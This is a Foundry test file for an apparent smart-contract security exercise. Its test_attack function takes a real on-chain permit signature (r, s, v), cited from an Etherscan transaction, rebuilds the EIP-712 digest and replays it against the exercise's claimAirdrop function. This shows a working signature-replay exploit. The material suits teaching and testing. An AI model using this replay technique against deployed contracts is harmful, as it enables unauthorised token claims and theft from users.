// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Week22Exercise4} from "../src/Week22Exercise4.sol";
import {TestHelpers} from "./TestHelper.sol";

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

contract Week22Exercise4Test is TestHelpers {
    using Strings for uint256;
    using MessageHashUtils for bytes32;
    using ECDSA for bytes32;
    Week22Exercise4 public exercise;

    address owner;
    uint256 privateKey =
        0x1010101010101010101010101010101010101010101010101010101010101010;

    function setUp() public {
        owner = vm.addr(privateKey);
        exercise = new Week22Exercise4();
    }

    // function test_Attack() public {
    //     uint256 amount = 100;

    //     bytes32 msgHash = keccak256(abi.encode(amount))
    //         .toEthSignedMessageHash();

    //     (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, msgHash);

    //     bytes memory signature = abi.encodePacked(r, s, v);
    //     assertEq(signature.length, 65);

    //     exercise.claimAirdrop(100, msgHash, signature);
    // }

    function getTypeHashData() internal pure returns (bytes memory typehashAndData) {
        bytes32 a = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
        bytes32 b = 0x000000000000000000000000b1700c08aa433b319def2b4bb31d6de5c8512d96;
        bytes32 c = 0x00000000000000000000000068b3465833fb72a70ecdf485e0e4c7bd8665fc45;
        bytes32 d = 0x0000000000000000000000000000000000000000000000000000000002f82754;
        bytes32 e = 0x0000000000000000000000000000000000000000000000000000000000000000;
        bytes32 f = 0x00000000000000000000000000000000000000000000000000000000635222b7;


        bytes memory typehashAndData = abi.encodePacked(a, b, c, d, e, f);
        return typehashAndData;
    }

    function test_attack() public {
        // ORDER is (r, s) = abi.decode(signature, (bytes32, bytes32));
        bytes32 r = 0xd0e5696f21d14218bff84c8818dbe6c79812f6fdda9424a7efec907c6d7ef002;
        bytes32 s = 0x70b6afeb66a51f42881763c7a19d8e1421b9b5fc0200cd4cee06a1a9a4d3207f;
        uint8 v = 28;


        bytes memory signature = abi.encodePacked(r, s, v);

        bytes32 domainSeparator = 0x06c37168a7db5138defc7866392bb87a741f9b3d104deb5094588ce041cae335;



        bytes32 hashStruct = keccak256(getTypeHashData());

        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, hashStruct)
        );


        address recoveredSigner = ecrecover(digest, v, r, s);
        console2.log("recoveredSigner: ", recoveredSigner);

        // bytes32 digest = _verifySignature(offerer, orderHash, signature);

        exercise.claimAirdrop(100, digest, signature);

    }
}

// typehash and data
// 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9000000000000000000000000b1700c08aa433b319def2b4bb31d6de5c8512d9600000000000000000000000068b3465833fb72a70ecdf485e0e4c7bd8665fc450000000000000000000000000000000000000000000000000000000002f82754000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000635222b7;
// 6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9000000000000000000000000b1700c08aa433b319def2b4bb31d6de5c8512d9600000000000000000000000068b3465833fb72a70ecdf485e0e4c7bd8665fc450000000000000000000000000000000000000000000000000000000002f82754000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000635222b7;

// 6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9
// 000000000000000000000000b1700c08aa433b319def2b4bb31d6de5c8512d96
// 00000000000000000000000068b3465833fb72a70ecdf485e0e4c7bd8665fc45
// 0000000000000000000000000000000000000000000000000000000002f82754
// 0000000000000000000000000000000000000000000000000000000000000000
// 00000000000000000000000000000000000000000000000000000000635222b7

// https://etherscan.io/tx/0x9050798d7989583632defa0c26e42d9fdfc30a66aa016fea849af303d7eda969

// 1	token	address	0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
// 2	value	uint256	49817428
// 3	deadline	uint256	1666327223

// 4	v	uint8	28
// 5	r	bytes32	0xd0e5696f21d14218bff84c8818dbe6c79812f6fdda9424a7efec907c6d7ef002
// 6	s	bytes32	0x70b6afeb66a51f42881763c7a19d8e1421b9b5fc0200cd4cee06a1a9a4d3207f
